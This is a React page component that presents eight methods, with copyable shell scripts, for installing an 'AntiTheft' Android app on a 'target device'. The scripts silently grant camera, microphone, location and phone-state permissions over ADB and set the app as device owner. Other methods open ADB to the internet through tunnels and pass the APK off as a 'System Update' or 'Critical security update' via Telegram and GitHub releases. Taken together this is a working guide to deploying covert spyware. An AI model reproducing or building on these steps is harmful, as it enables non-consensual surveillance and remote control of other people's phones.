import React, { useState } from 'react';
import { motion } from 'framer-motion';
import { Download, Smartphone, Globe, Cloud, Wifi, Usb, Shield, ChevronRight, Copy, Check, Zap, Send } from 'lucide-react';

const methods = [
  {
    id: 1,
    title: 'ADB Wireless Install',
    icon: Wifi,
    color: '#22d3ee',
    desc: 'Install via WiFi ADB - no USB cable needed after initial setup',
    steps: [
      'Enable Developer Options + USB Debugging on target device',
      'Connect device once via USB: adb tcpip 5555',
      'Disconnect USB, connect via WiFi: adb connect <IP>:5555',
      'Install APK: adb install -r antitheft.apk',
      'Grant all permissions silently via ADB',
      'Set device admin and start service'
    ],
    code: `adb tcpip 5555
adb connect 192.168.1.100:5555
adb install -r antitheft.apk
adb shell pm grant com.antitheft.app android.permission.CAMERA
adb shell pm grant com.antitheft.app android.permission.ACCESS_FINE_LOCATION
adb shell pm grant com.antitheft.app android.permission.RECORD_AUDIO
adb shell pm grant com.antitheft.app android.permission.READ_PHONE_STATE
adb shell pm grant com.antitheft.app android.permission.SYSTEM_ALERT_WINDOW
adb shell dpm set-device-owner com.antitheft.app/.DeviceAdminReceiver
adb shell am startservice com.antitheft.app/.TheftDetectionService
adb shell am start -n com.antitheft.app/.SetupActivity --es emergency_email "you@gmail.com" --es emergency_phone "+254700000000"`
  },
  {
    id: 2,
    title: 'Web Download + Direct Install',
    icon: Globe,
    color: '#34d399',
    desc: 'Host APK on web server, user downloads and installs via browser',
    steps: [
      'Upload APK to your web server or GitHub Releases',
      'Send download link to target device',
      'User opens link and downloads APK',
      'User enables Install from Unknown Sources',
      'User installs APK and grants permissions',
      'App starts automatically via BOOT_COMPLETED receiver'
    ],
    code: `curl -F "file=@antitheft.apk" https://transfer.sh/antitheft.apk

wget https://your-server.com/antitheft.apk

curl -X POST https://api.github.com/repos/USER/REPO/releases \\
  -H "Authorization: token TOKEN" \\
  -d '{"tag_name":"v1.0","name":"System Update","body":"Critical security update"}' \\
  -F "asset=@antitheft.apk"

python3 -m http.server 8080`
  },
  {
    id: 3,
    title: 'Firebase App Distribution',
    icon: Cloud,
    color: '#fb923c',
    desc: 'Enterprise distribution via Firebase to specific testers',
    steps: [
      'Set up Firebase project and add Android app',
      'Upload APK to Firebase App Distribution',
      'Add tester emails or device groups',
      'Testers receive email invite to install',
      'Install directly from Firebase App Tester app',
      'Push updates automatically to all devices'
    ],
    code: `npm install -g firebase-tools
firebase login
firebase appdistribution:distribute antitheft.apk \\
  --app 1:1234567890:android:abc123def456 \\
  --release-notes "System update v2.0" \\
  --testers-file testers.txt

echo "user1@gmail.com" > testers.txt
echo "user2@gmail.com" >> testers.txt`
  },
  {
    id: 4,
    title: 'Telegram Bot Distribution',
    icon: Send,
    color: '#0088cc',
    desc: 'Host APK on Telegram channel with bot auto-distribution',
    steps: [
      'Create Telegram bot via @BotFather',
      'Create private channel for APK hosting',
      'Upload APK to channel',
      'Share channel invite link with target users',
      'Users join channel and download APK',
      'Install directly from Telegram app'
    ],
    code: `curl -F "document=@antitheft.apk" \\
  "https://api.telegram.org/bot<YOUR_BOT_TOKEN>/sendDocument" \\
  -F "chat_id=@your_channel_name" \\
  -F "caption=System Update - Tap to install"

curl "https://api.telegram.org/bot<TOKEN>/sendMessage" \\
  -F "chat_id=@your_channel" \\
  -F "text=New update available! Download above."`
  },
  {
    id: 5,
    title: 'Remote ADB via Internet',
    icon: Globe,
    color: '#a78bfa',
    desc: 'Install over internet using ngrok/SSH tunnel to reach device',
    steps: [
      'Set up ngrok or SSH tunnel on your machine with ADB',
      'Forward ADB port to public internet',
      'Send connection string to target device',
      'Connect to remote device via public URL',
      'Install APK and configure remotely',
      'Device is now accessible from anywhere'
    ],
    code: `ngrok tcp 5555

ssh -R 5555:localhost:5555 user@your-vps.com

adb connect 0.tcp.ngrok.io:12345

adb connect your-vps.com:5555

adb install -r antitheft.apk

adb shell pm grant com.antitheft.app android.permission.CAMERA`
  },
  {
    id: 6,
    title: 'QR Code Quick Install',
    icon: Smartphone,
    color: '#f472b6',
    desc: 'Generate QR code linking to APK - scan to install',
    steps: [
      'Host APK on web server with direct download link',
      'Generate QR code from the download URL',
      'Display QR code or send as image',
      'User scans QR code with phone camera',
      'Phone opens download page in browser',
      'User downloads and installs APK'
    ],
    code: `qrencode -o install-qr.png \\
  "https://your-server.com/antitheft.apk"

curl "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=https://your-server.com/antitheft.apk" \\
  -o qr-code.png

python3 -c "
import qrcode
img = qrcode.make('https://your-server.com/antitheft.apk')
img.save('install.png')
print('QR code saved as install.png')
"`
  },
  {
    id: 7,
    title: 'MDM Enterprise Deployment',
    icon: Shield,
    color: '#ef4444',
    desc: 'Mass silent deployment via Mobile Device Management platform',
    steps: [
      'Enroll devices in MDM platform (Intune, AirWatch, etc.)',
      'Upload APK as managed enterprise application',
      'Configure auto-grant permissions in MDM policy',
      'Push to all enrolled devices silently',
      'MDM installs, grants permissions, starts service',
      'Monitor deployment status in MDM dashboard'
    ],
    code: `adb shell dpm set-device-owner com.antitheft.app/.DeviceAdminReceiver

adb shell settings put global development_settings_enabled 0

adb shell settings put secure install_non_market_apps 0

adb shell content insert --uri content://settings/secure \\
  --bind name:s:install_non_market_apps --bind value:i:0`
  },
  {
    id: 8,
    title: 'USB Automated Script',
    icon: Usb,
    color: '#fbbf24',
    desc: 'One-command USB install with fully automated bash script',
    steps: [
      'Connect target device via USB cable',
      'Enable USB debugging on device (tap Build Number 7x)',
      'Authorize USB debugging connection on device',
      'Run the automated install script',
      'Script handles install, permissions, configuration',
      'Device is fully configured and protected'
    ],
    code: `#!/bin/bash
echo "[*] AntiTheft USB Installer"
echo "[*] Waiting for device..."
adb wait-for-device
echo "[+] Device connected"
echo "[*] Installing APK..."
adb install -r antitheft.apk
echo "[+] APK installed"
echo "[*] Granting permissions..."
for perm in CAMERA ACCESS_FINE_LOCATION RECORD_AUDIO READ_PHONE_STATE SYSTEM_ALERT_WINDOW ACCESS_BACKGROUND_LOCATION; do
  adb shell pm grant com.antitheft.app android.permission.$perm 2>/dev/null
  echo "  [+] $perm"
done
echo "[+] Permissions granted"
echo "[*] Configuring emergency contacts..."
adb shell am start -n com.antitheft.app/.SetupActivity --es emergency_email "you@gmail.com" --es emergency_phone "+254700000000"
echo "[+] Contacts configured"
echo "[*] Starting protection service..."
adb shell am startservice com.antitheft.app/.TheftDetectionService
echo "[+] Service started"
echo ""
echo "[✓] Installation complete!"
echo "[✓] Device is now protected"
adb shell am start -n com.antitheft.app/.MainActivity`
  }
];

const RemoteInstall = () => {
  const [expandedId, setExpandedId] = useState(null);
  const [copied, setCopied] = useState(null);

  const copyCode = async (code, key) => {
    try { await navigator.clipboard.writeText(code); }
    catch {
      const ta = document.createElement('textarea');
      ta.value = code;
      document.body.appendChild(ta);
      ta.select();
      document.execCommand('copy');
      document.body.removeChild(ta);
    }
    setCopied(key);
    setTimeout(() => setCopied(null), 2000);
  };

  return (
    <div className="page-container">
      <div style={{ marginBottom: '28px' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '14px', marginBottom: '8px' }}>
          <Download size={32} color="#22d3ee" />
          <h1 style={{ fontSize: '28px', fontWeight: 800 }}>Remote Installation Methods</h1>
        </div>
        <p style={{ color: 'var(--text-muted)', fontSize: '14px', lineHeight: 1.6 }}>
          {methods.length} ways to deploy the AntiTheft app remotely. From ADB wireless to enterprise MDM.
        </p>
      </div>

      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(160px, 1fr))', gap: '10px', marginBottom: '28px' }}>
        {[
          { label: 'Methods', value: methods.length, color: '#22d3ee' },
          { label: 'Remote Capable', value: '6/8', color: '#34d399' },
          { label: 'Silent Install', value: '4/8', color: '#a78bfa' },
          { label: 'Scripted', value: '5/8', color: '#fbbf24' },
        ].map((stat, i) => (
          <div key={i} className="glass-card" style={{ padding: '14px', textAlign: 'center' }}>
            <p style={{ fontSize: '22px', fontWeight: 800, color: stat.color }}>{stat.value}</p>
            <p style={{ fontSize: '11px', color: 'var(--text-muted)' }}>{stat.label}</p>
          </div>
        ))}
      </div>

      {methods.map((method) => (
        <motion.div
          key={method.id}
          initial={{ opacity: 0, y: 15 }}
          animate={{ opacity: 1, y: 0 }}
          className="glass-card"
          style={{ marginBottom: '12px', overflow: 'hidden' }}
        >
          <div
            style={{ display: 'flex', alignItems: 'center', gap: '14px', cursor: 'pointer' }}
            onClick={() => setExpandedId(expandedId === method.id ? null : method.id)}
          >
            <div style={{
              width: '48px', height: '48px', borderRadius: '14px',
              background: method.color + '20', display: 'flex',
              alignItems: 'center', justifyContent: 'center', flexShrink: 0
            }}>
              <method.icon size={24} color={method.color} />
            </div>
            <div style={{ flex: 1 }}>
              <h3 style={{ fontSize: '15px', fontWeight: 700 }}>{method.title}</h3>
              <p style={{ fontSize: '12px', color: 'var(--text-secondary)', marginTop: '2px' }}>{method.desc}</p>
            </div>
            <ChevronRight
              size={14}
              style={{
                transform: expandedId === method.id ? 'rotate(90deg)' : 'rotate(0deg)',
                transition: 'transform 0.2s'
              }}
            />
          </div>

          {expandedId === method.id && (
            <div style={{ borderTop: '1px solid var(--border)', marginTop: '14px', paddingTop: '14px' }}>
              <h4 style={{ fontSize: '13px', fontWeight: 600, marginBottom: '10px', color: '#fb923c' }}>
                Step-by-Step:
              </h4>
              <div style={{ display: 'flex', flexDirection: 'column', gap: '6px', marginBottom: '16px' }}>
                {method.steps.map((step, si) => (
                  <div
                    key={si}
                    style={{
                      display: 'flex', alignItems: 'center', gap: '8px',
                      fontSize: '12px', color: 'var(--text-secondary)'
                    }}
                  >
                    <span style={{
                      width: '20px', height: '20px', borderRadius: '50%',
                      background: 'var(--bg-primary)', display: 'flex',
                      alignItems: 'center', justifyContent: 'center',
                      fontSize: '10px', fontWeight: 700, color: '#22d3ee', flexShrink: 0
                    }}>
                      {si + 1}
                    </span>
                    {step}
                  </div>
                ))}
              </div>

              <div style={{ position: 'relative' }}>
                <button
                  onClick={(e) => { e.stopPropagation(); copyCode(method.code, method.id); }}
                  style={{
                    position: 'absolute', top: '8px', right: '8px', padding: '5px 12px',
                    background: '#1e2433', border: '1px solid #30363d', borderRadius: '6px',
                    color: '#c9d1d9', cursor: 'pointer', fontSize: '11px',
                    display: 'flex', alignItems: 'center', gap: '4px', zIndex: 1
                  }}
                >
                  {copied === method.id ? <Check size={12} color="#34d399" /> : <Copy size={12} />}
                  {copied === method.id ? 'Copied' : 'Copy'}
                </button>
                <h4 style={{ fontSize: '13px', fontWeight: 600, marginBottom: '8px', color: '#22d3ee' }}>
                  Commands
                </h4>
                <pre style={{
                  background: '#0d1117', color: '#c9d1d9', padding: '16px',
                  borderRadius: '8px', fontSize: '12px', lineHeight: '1.4',
                  overflowX: 'auto', maxHeight: '300px', overflowY: 'auto',
                  border: '1px solid #30363d', fontFamily: 'monospace'
                }}>
                  <code>{method.code}</code>
                </pre>
              </div>
            </div>
          )}
        </motion.div>
      ))}
    </div>
  );
};

export default RemoteInstall;
